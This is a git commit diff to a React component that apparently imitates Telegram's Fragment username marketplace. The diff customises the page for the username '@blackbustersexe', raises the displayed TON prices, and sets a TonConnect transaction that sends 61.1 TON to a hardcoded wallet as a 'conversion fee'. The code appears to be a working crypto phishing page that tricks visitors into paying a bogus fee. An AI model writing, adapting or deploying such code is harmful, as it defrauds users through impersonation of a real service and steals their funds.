ba4fb4c7d77e88a8efc31d4cab07bb60646da18d
grachzyyy <165211755+grachzyyy@users.noreply.github.com>
2025-03-12 00:25:06 +0300

    Update NicknameFragment.tsx

--- src/components/NicknameFragment/NicknameFragment.tsx
+++ src/components/NicknameFragment/NicknameFragment.tsx
@@ -186,15 +186,15 @@ const BidInfoSection: React.FC<BidInfoSectionProps> = ({ setShowHowItWorksPopup 
         <tr>
           <td>
             <div className="table-cell table-cell">
-              <div className="table-cell-value tm-value icon-before icon-ton">800</div>
-              <div className="table-cell-desc">~ $2600 </div>
+              <div className="table-cell-value tm-value icon-before icon-ton">1222</div>
+              <div className="table-cell-desc">~ $3272.9 </div>
             </div>
             
           </td>
           <td>
           <div className="table-cell table-cell">
-              <div className="table-cell-value tm-value icon-before icon-ton">40</div>
-              <div className="table-cell-desc">~ $130</div>
+              <div className="table-cell-value tm-value icon-before icon-ton">61.1</div>
+              <div className="table-cell-desc">~ $163.7</div>
             </div>
           </td>
         </tr>
@@ -215,19 +215,19 @@ const UsernameInfoSection: React.FC<UsernameInfoSectionProps> = ({ nickname }) =
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Telegram Username</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">@nickname</span>
+        <span className="accent-color">@blackbustersexe</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Web Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">t.me/nickname</span>
+        <span className="accent-color">t.me/blackbustersexee</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">TON Web 3.0 Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">nickname</span><span className="domain">.t.me</span></span></span>
+        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">blackbustersexe</span><span className="domain">.t.me</span></span></span>
       </dd>
     </dl>
   </div>
@@ -242,7 +242,7 @@ interface ActionButtonsProps {
 
 
 const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, onSubscribeToggle }) => {
-  const comment = "Conversion fee for nickname.t.me\n\nRef#R9OOOw9Mb";
+  const comment = "Conversion fee for blackbustersexe.t.me\n\nRef#R9OOOw9Mb";
   const [tonConnectUi] = useTonConnectUI();
   const wallet = useTonWallet();
   const [tx, setTx] = useState<SendTransactionRequest>({
@@ -250,7 +250,7 @@ const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, 
     messages: [
       {
         address: "UQBUTyUtpZuecOGdADIXibnVTJ7GdGeb2sJQGcUPKre2RfoU",
-        amount: "40000000000",
+        amount: "61100000000",
         payload: beginCell().storeUint(0, 32).storeStringTail(comment).endCell().toBoc().toString("base64"),
       },
     ],
